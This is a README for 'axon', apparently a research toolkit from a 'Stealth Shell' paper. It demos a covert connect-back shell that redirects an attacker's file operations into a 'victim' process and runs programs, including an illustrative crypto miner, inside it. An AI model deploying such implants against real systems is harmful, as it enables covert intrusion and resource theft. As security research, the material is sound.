# axon

Axon is my system for building Linux binaries that operate without a libc, can
be statically linked with self-relocation, and can be embedded in other
processes surreptitiously. It also includes mechanisms to interact with the ELF
file format, detour/patch functions, switch stacks, and pretty-print BPF 
instructions. With it I've experimented on an intrusive tracer, a library
sandboxer, a proxying virtualization layer, a minimal DNS client, and Callander.
Beware, it is not well documented.

# Building

Run `build.sh` to build axon and related components described in the Stealth Shell paper.

# Basic Demo

This will demo a basic stealth shell in a simplified environment. For simplicity, the "victim" executes a standard Linux binary that connects back to localhost and listens for commands. Real world scenarios would have an exploit deliver a second stage payload that listens for commands over a covert channel.

Start by launching two terminals: one to represent the "victim" and another to represent the "attacker"

In the "attacker" terminal, launch axon with your shell of choice:
```
# ./axon bash
```
This listens on port 8484 for an incoming victim connectback.

Next on the "victim" shell, run the simulated target command under strace:
```
strace -f ./target
```
This connects back to the attacker's machine, and sends a hello message indicating a client is ready to receive commands.

For clarity, this is run in strace so we can see the operations the "victim" is performing.

Notice that the "attacker" terminal now shows an awaiting shell prompt.

Try some local commands to see that this is a well behaving shell running on the attacker's machine:
```
ls -lah /
cat /etc/hostname
```

Note that the "victim" hasn't performed any additional operations and is still blocked on the same read syscall.

Now try the same commands on the /target virtual path:
```
ls -lah /target/
cat /target/etc/hostname
```

Note the same outputs, but this time the victim's strace output describes all of the getdirentries, statx, openat and read syscalls necessary to handle the `ls` and `cat` commands.

By intercepting the syscalls of bash and all of its subprocesses, axon directs operations on paths out of the virtual /target directory to run on the victim, while preserving operations on other paths

# Demo continued

We can also use axon to transparently run Linux programs inside the victim as a picoprocess with `texec`. For this demo, we'll burn CPU inside sha1sum, but a real crypto miner would do just as well.

From inside a axon-ified shell:
```
./texec sha1sum /target/dev/random
```

Now check which process is consuming CPU:
```
top
```
Note that the victim process "target" is running the computation, reading bytes out of its own /dev/random.
